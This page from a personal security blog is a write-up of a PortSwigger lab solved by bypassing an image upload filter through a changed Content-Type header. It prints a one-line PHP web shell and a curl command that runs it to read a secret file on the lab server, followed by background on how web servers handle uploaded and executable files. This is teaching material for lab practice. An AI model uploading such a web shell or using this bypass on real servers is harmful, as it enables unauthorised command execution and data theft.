@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web shell upload via Content-Type restriction bypass [Portswigger Lab] - G.R</title>
+<meta name="description" content="This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
+To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.">
+<meta name="author" content="Giorgi Rcheulishvili">
+<link rel="canonical" href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/">
+
+
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/pygments.css">
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+</head>
+<body>
+
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a href="/" class="navbar-brand">G.R</a>
+    </div>
+    <div class="collapse navbar-collapse navbar-ex1-collapse">
+      <ul class="nav navbar-nav">
+        
+          
+          <li><a href="/research/">Research</a></li>
+        
+          
+          <li><a href="/projects/">Projects</a></li>
+        
+          
+          <li class="active"><a href="/archive/">Archive</a></li>
+        
+          
+          <li><a href="/about/">About</a></li>
+        
+          
+          <li><a href="/manifesto/">Approach</a></li>
+        
+      </ul>
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            
+            
+            
+            
+            
+            
+            <li class="active"><a href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/" hreflang="en">EN</a></li>
+          
+            
+            
+            
+            
+            
+            
+              
+                
+                  
+                
+              
+              
+            
+            <li><a href="/ka/untranslated/?from=%2Farchive%2Fnotes%2F1-web-applications%2F1f-file-upload-vulnerabilities%2F1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab%2F&amp;t=Web&#43;shell&#43;upload&#43;via&#43;Content-Type&#43;restriction&#43;bypass&#43;%5BPortswigger&#43;Lab%5D" hreflang="ka">ქარ</a></li>
+          
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-sm-9">
+      
+<ol class="breadcrumb">
+  <li><a href="/"><i class="fa fa-home"></i></a></li>
+  
+  <li><a href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/">File Upload Vulnerabilities</a></li>
+  
+  <li class="active">Web shell upload via Content-Type restriction bypass [Portswigger Lab]</li>
+</ol>
+
+      
+
+<article>
+  <header class="page-header">
+    <h1>Web shell upload via Content-Type restriction bypass [Portswigger Lab]</h1>
+  </header>
+
+  
+  <div class="panel panel-default">
+    <div class="panel-body post-info">
+      <span class="label label-success">4 min read</span>
+      
+      <span class="label label-default">Date</span>
+      <span class="published"><i class="fa fa-calendar"></i> <time datetime="2024-07-06">July 6, 2024</time></span>
+      
+      
+      <span class="label label-default">Category</span>
+      <a href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/">File Upload Vulnerabilities</a>
+      
+      
+    </div>
+  </div>
+  
+
+  <div class="entry-content">
+    <p>This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.</p>
+<p>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+<h3 id="solution">Solution:</h3>
+<p>So upon logging in my account, I can see the avatar upload field.</p>
+<figure><img src="/.gitbook/assets/Pasted%20image%2020240719144326.png">
+</figure>
+
+<p>Testing this functionality by uploading an empty <code>test.txt</code> file gives me an error</p>
+<p><code>Sorry, file type text/plain is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.</code></p>
+<p>The next thing I tried was to upload the same file but modify the HTTP request using burpsuite and change <code>Content-Type: Text/Plain</code> to <code>Content-Type: image/jpeg</code>. This bypassed a defense mechanism and as a result it let me upload a text file</p>
+<figure><img src="/.gitbook/assets/Pasted%20image%2020240719145007.png">
+</figure>
+
+<p>Now it&rsquo;s time to upload a web shell <code>mal.php</code> with the following contents:</p>
+<p><code>&lt;?php echo system($_GET['command']); ?&gt;</code></p>
+<figure><img src="/.gitbook/assets/Pasted%20image%2020240719145330.png">
+</figure>
+
+<p>Now, since I know that this <code>mal.php</code> is uploaded in <code>/files/avatars/mal.php</code>, I can call it using CURL.</p>
+<p>And we got the secret</p>
+<pre tabindex="0"><code>curl -X GET &#34;https://0a2200b703596e51800635e70004004c.web-security-academy.net/files/avatars/mal.php?command=cat%20../../../../home/carlos/secret&#34;
+
+7nJBS****************************7nJBS****************************
+</code></pre><p>remember that calls form curl like this repeats the response twice, so I had to remove the double of this output.</p>
+<p>The secret contents: <code>7nJB****************************</code></p>
+<hr>
+<p><strong>Impact of FUVs generally depend on two key factors</strong>:</p>
+<ul>
+<li>Which aspect of the file the website fails to validate properly, whether its the size, type, contents&hellip;</li>
+<li>what restrictions are imposed once file is uploaded</li>
+</ul>
+<p>In the worst case scenario, the file is not validated at all and the server configuration allows certain types to run as code - potentially giving an attacker web shell and full access to a webserver.</p>
+<p>In case filename isn&rsquo;t validated properly, an attacker might just replace original file with a malicious one.</p>
+<p>Failing to validate file size might also enable an attacker to perform a DoS.</p>
+<p><em><strong>How Web servers handle static file requests?</strong></em></p>
+<p>Generally, static files on a website can be mapped 1:1 with a filesystem hierarchy.</p>
+<p>Nowadays modern applications are dynamic and hence complex. Path of a request may not necessarily represent a filesystem entirely. Nowadays, web servers still deal with static requests for some static files like stylesheets, images etc.</p>
+<p>The process for handling such files is historically largely the same. - The server parses the path in the request to identify the file extension. Then uses this information to determine the filetype by comparing it to preconfigured mapping between extensions and MIME types.</p>
+<ul>
+<li>if the file is non-executable like HTML file, it may just send the file in the HTTP response</li>
+<li>if the file is executable like PHP or PYTHON and the server is configured to execute these files, it will assign variables based on the headers and parameters in the HTTP request before executing it. The result may be passed on to HTTP response after.</li>
+<li>if the file is executable, but the server is not configured to run them, it will generally respond with an error or in some cases, just send back the plain text representation of the code to the client. such misconfigurations may lead to code and sensitive data leakage. The <code>Content-Type</code> response header may provide clues as to what kind of file the server thinks it has served.</li>
+</ul>
+<p>As a precaution, servers generally only run scripts whose filetypes have been explicitly defined to execute. Otherwise they may return an error message or plaintext of source code. In such cases, it might only be possible to leak the source but won&rsquo;t be able to deploy a webshell.</p>
+<p>This kind of configuration will have a strict policy for directories where user can upload files than other locations on the filesystem that are assumed to be out of reach from users. If you can find a directory where user-uploaded files are not supposed to be, the code might execute.</p>
+<p>Web servers often use the <code>filename</code> field in <code>multipart/form-data</code> requests to determine the name and location where the file should be saved.</p>
+
+  </div>
+</article>
+
+    </div>
+    <div class="col-sm-3" id="sidebar">
+      <aside>
+
+
+<div id="aboutme">
+  <p><img class="img-thumbnail" src="http://localhost:1313/images/logo.png" alt="Giorgi Rcheulishvili"></p>
+  <p><strong>About Me: Giorgi Rcheulishvili</strong><br>Systems and infrastructure engineering - automation, containerization, and offensive security.</p>
+</div>
+
+
+<section class="well well-sm">
+  <ul class="list-group">
+
+    
+    <li class="list-group-item">
+      <h4>Social</h4>
+      <a href="https://github.com/grcheulishvili" target="_blank" rel="noopener"><i class="fa fa-github-square fa-lg"></i></a> 
+      <a href="https://www.linkedin.com/in/giorgi-rcheulishvili-bba988260/" target="_blank" rel="noopener"><i class="fa fa-linkedin-square fa-lg"></i></a>
+    </li>
+    
+
+    
+    
+    <li class="list-group-item">
+      <h4>Recent Posts</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item"><a href="/about/">Technical Biography</a></li>
+        
+        <li class="list-group-item"><a href="/manifesto/">Engineering Philosophy</a></li>
+        
+        <li class="list-group-item"><a href="/research/building-a-polymorphic-engine/">Polymorphic Engine Development</a></li>
+        
+        <li class="list-group-item"><a href="/research/stack-mechanics-and-overflows/">The Mechanical Inevitability of Buffer Overflows</a></li>
+        
+        <li class="list-group-item"><a href="/archive/ssrf-exploitation/">Research: Server-Side Request Forgery (SSRF) Mechanics</a></li>
+        
+      </ul>
+    </li>
+    
+
+    
+    <li class="list-group-item">
+      <h4>Categories</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item"><a href="/research/">Research <span class="badge">3</span></a></li>
+        
+        <li class="list-group-item"><a href="/archive/">Archives <span class="badge">18</span></a></li>
+        
+        <li class="list-group-item"><a href="/projects/">Projects <span class="badge">3</span></a></li>
+        
+        <li class="list-group-item"><a href="/engineering/">Engineering <span class="badge">1</span></a></li>
+        
+      </ul>
+    </li>
+    
+
+    
+    <li class="list-group-item">
+      <h4>Tags</h4>
+      <div class="tag-cloud">
+        
+        <a href="/tags/assembly" class="tag-2">assembly</a>
+        
+        <a href="/tags/c2" class="tag-2">c2</a>
+        
+        <a href="/tags/ctfd" class="tag-2">ctfd</a>
+        
+        <a href="/tags/cti" class="tag-2">cti</a>
+        
+        <a href="/tags/databases" class="tag-2">databases</a>
+        
+        <a href="/tags/devsecops" class="tag-2">devsecops</a>
+        
+        <a href="/tags/docker" class="tag-2">docker</a>
+        
+        <a href="/tags/elk" class="tag-2">elk</a>
+        
+        <a href="/tags/engineering" class="tag-2">engineering</a>
+        
+        <a href="/tags/go" class="tag-2">go</a>
+        
+        <a href="/tags/grafana" class="tag-2">grafana</a>
+        
+        <a href="/tags/hardening" class="tag-2">hardening</a>
+        
+        <a href="/tags/infrastructure" class="tag-2">infrastructure</a>
+        
+        <a href="/tags/internals" class="tag-2">internals</a>
+        
+        <a href="/tags/linux" class="tag-2">linux</a>
+        
+        <a href="/tags/maldev" class="tag-2">maldev</a>
+        
+        <a href="/tags/monitoring" class="tag-2">monitoring</a>
+        
+        <a href="/tags/network-security" class="tag-2">network security</a>
+        
+        <a href="/tags/pentesting" class="tag-2">pentesting</a>
+        
+        <a href="/tags/portswigger" class="tag-2">portswigger</a>
+        
+        <a href="/tags/postgresql" class="tag-2">postgresql</a>
+        
+        <a href="/tags/python" class="tag-2">python</a>
+        
+        <a href="/tags/rce" class="tag-2">rce</a>
+        
+        <a href="/tags/red-team" class="tag-2">red team</a>
+        
+        <a href="/tags/research" class="tag-2">research</a>
+        
+        <a href="/tags/reverse-engineering" class="tag-2">reverse engineering</a>
+        
+        <a href="/tags/sqli" class="tag-2">sqli</a>
+        
+        <a href="/tags/ssrf" class="tag-2">ssrf</a>
+        
+        <a href="/tags/web-security" class="tag-2">web security</a>
+        
+      </div>
+    </li>
+    
+
+    
+    
+    
+    
+    <li class="list-group-item">
+      <h4>Archives</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item">2025</li>
+        
+        <li class="list-group-item">2024</li>
+        
+      </ul>
+    </li>
+    
+
+  </ul>
+</section>
+</aside>
+
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div class="container">
+    <hr>
+    <div class="row">
+      <div class="col-xs-10">
+        &copy; 2026 Giorgi Rcheulishvili
+        &middot; Powered by
+        <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>,
+        <a href="https://getbootstrap.com/docs/3.4/" target="_blank" rel="noopener">Bootstrap</a>,
+        theme styled after
+        <a href="https://github.com/getpelican/pelican-themes/tree/master/pelican-bootstrap3" target="_blank" rel="noopener">pelican-bootstrap3</a>
+      </div>
+      <div class="col-xs-2">
+        <p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+</body>
+</html>
